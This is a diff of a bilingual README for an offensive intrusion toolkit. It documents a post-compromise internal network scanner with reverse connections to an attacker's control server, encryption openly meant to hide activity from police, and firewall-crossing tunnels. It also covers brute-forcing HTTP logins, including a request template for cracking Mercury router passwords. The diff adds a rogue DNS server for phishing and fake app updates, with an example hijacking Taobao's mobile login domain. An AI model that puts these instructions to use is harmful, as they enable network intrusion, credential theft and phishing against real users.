@@ -3,13 +3,10 @@
 
 
 中文:
-网络探测框架,适用于入侵到内网探测其它网络设备,探测器具有体积小,功能多,而且带有反向连接从内网穿透出外网连接控制终端,通信数据采用动态加密,再也不怕警察叔叔知道我在干坏事儿啦,为了方便破解一些弱口令设备,内部带有在线破解功能(暂时支持HTTP 破解).如果觉得这些功能满足不了需求,可以使用端口映射把你需要的工具直接通过隧道对接到内网的某台指定的主机端口上进行扫描
+网络探测框架,适用于入侵到内网探测其它网络设备,探测器具有体积小,功能多,而且带有反向连接从内网穿透出外网连接控制终端,通信数据采用动态加密,再也不怕警察叔叔知道我在干坏事儿啦,为了方便破解一些弱口令设备,内部带有在线破解功能(暂时支持HTTP 破解).如果觉得这些功能满足不了需求,可以使用端口映射把你需要的工具直接通过隧道对接到内网的某台指定的主机端口上进行扫描..    --  LCatro<br/>
 
 English:
-This is an internal network scanner like meterpreter .I will create more function into it scanner (now include many basic network scanner and network crack [like BurpSuite,crack HTTP]).Reverse connect function is to facilitate the attacker management hacked machine and crypte communication.Tunnel connect help your attack process's network flow  crossing the firewall of internal network.
-
-
-网络探测框架,适用于入侵到内网探测其它网络设备,探测器具有体积小,功能多,而且带有反向连接从内网穿透出外网连接控制终端,通信数据采用动态加密,再也不怕警察叔叔知道我在干坏事儿啦,为了方便破解一些弱口令设备,内部带有在线破解功能(暂时支持HTTP 破解).如果觉得这些功能满足不了需求,可以使用端口映射把你需要的工具直接通过隧道对接到内网的某台指定的主机端口上进行扫描..    --  LCatro
+This is an internal network scanner like meterpreter .I will create more function into it scanner (now include many basic network scanner and network crack [like BurpSuite,crack HTTP]).Reverse connect function is to facilitate the attacker management hacked machine and crypte communication.Tunnel connect help your attack process's network flow  crossing the firewall of internal network.<br/>
 
 
 ***
@@ -19,7 +16,7 @@ scanner.exe 控制台启动  [Launch it by console]<br/>
 scanner.exe -bind [%port%] 绑定端口,远程访问  [Bind a local port for waitting you to connect it]<br/>
 scanner.exe -recon %ip% [%port%] 反向连接,远程访问,默认是80,注意记得先启动reverse_server ,不然scanner.exe 不能成功连接  [Reverse connect to specify ip,WARNING!Remenber launch reverse_server first and then using this parameter launch scanner.exe]<br/>
 
-###使用方法  [How to launch it ]
+###使用方法  [How to use it ]
 扫描当前网段存活的主机,并且自动搜集数据  [using ARP request to query live machine in current network]<br/>
 using:arp<br/>
 获取当前主机的网络信息  [get this machine's information]<br/>
@@ -38,6 +35,8 @@ using:tracert %ip/host%<br/>
 using:getpage %ip% [-PORT:%port%] [-PATH:%path%]<br/>
 启动端口转发功能  [tunnal port]<br/>
 using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]<br/>
+启动DNS 服务器 [dns server]<br/>
+using:dns [run|start] | add %host% %ip% | delete %ip%<br/>
 显示帮助  [show help]<br/>
 using:help<br/>
 退出  [exit scanner]<br/>
@@ -70,7 +69,7 @@ using:quit<br/>
 	Content-length: %length%<br/>
 	Pragma: no-cache<br/>
 	<br/>
-	user=%username%&pass=%password%<br/>
+	**user=%username%&pass=%password%**<br/>
 	
 	其中Content-length: %length% 的意思是让程序自动在此填充上下文的大小<br/>[因为这个长度是会变化的],%username% 和%password% 就是自动填充用户名和密码<br/>[这里也可以不需要全部都用,比如破解水星路由器,直接填%password% 即可启动]<br/>最后输入<end>来确认数据包填写完成,如果中间某个位置出现填写错误就输入<reset>来重新填写破解数据包,下面的输入成功判断条件也是同理..
 	
@@ -81,24 +80,24 @@ using:quit<br/>
 	
 	now cracking!
 	
-	network crack - target:192.168.1.103:80
-	username:root password:toor
+	**network crack - target:192.168.1.103:80
+	username:root password:toor**
 	
 	破解完成
 	
 	
 	表达式函数:
 	
-	base64(%string%) -- 采用base64 编码
-	time() -- 获取系统时间
-	len(%string%) -- 统计字符串长度
-	rnd([%low%-%up%]) -- 在%low% 到%up% 之间生成随机数
+	**base64(%string%)** -- 采用base64 编码
+	**time()** -- 获取系统时间
+	**len(%string%)** -- 统计字符串长度
+	**rnd([%low%-%up%])** -- 在%low% 到%up% 之间生成随机数
 	
 	Example :
 	
 	破解水星的数据包 (其它都差不多,关键在Cookie):
 	
-	Cookie: a2404_pages=10; a2404_times=5; Authorization=Basic%20base64(admin:%password%)\r\n
+	Cookie: a2404_pages=10; a2404_times=5; **Authorization=Basic%20base64(admin:%password%)**\r\n
 	
 	接下来会把%password% 先填充好之后再编码base64
 	
@@ -106,12 +105,22 @@ using:quit<br/>
 	
 
 
-####端口转发原理:
+
+####DNS 服务器 [About DNS Server]
+
+DNS 服务器是针对内网的信息钓鱼,比如通过伪造的站点来钓得更多的个人信息或者欺骗应用程序更新,如果上面的用法还不太明白的话可以看这里 [DNS server usualy use redirecting to phishing sites]
+
+dns run 启动DNS 服务器 [run dns server]
+dns exit 退出DNS 服务器 [exit dns server]
+dns add m.login.taobao.com 127.0.0.1 把淘宝的手机登陆域名绑定到本地IP [point m.login.taobao.com to localhost via dns setting]
+dns delete www.baidu.com 删除DNS 查询项目 [delete this record]
+
+
+####端口转发原理 [tunnal port design]
 ####![image](https://raw.githubusercontent.com/lcatro/network_backdoor/master/scanner_framework/route_design.png)
 
-
 ###Other
-===
+
 #####reverse_server 是用来做反向连接用的服务端
 
 #####scanner.exe -bind 参数启动程序需要自己主动连过去,但是客户端还没写,也没什么需求,以后慢慢来..
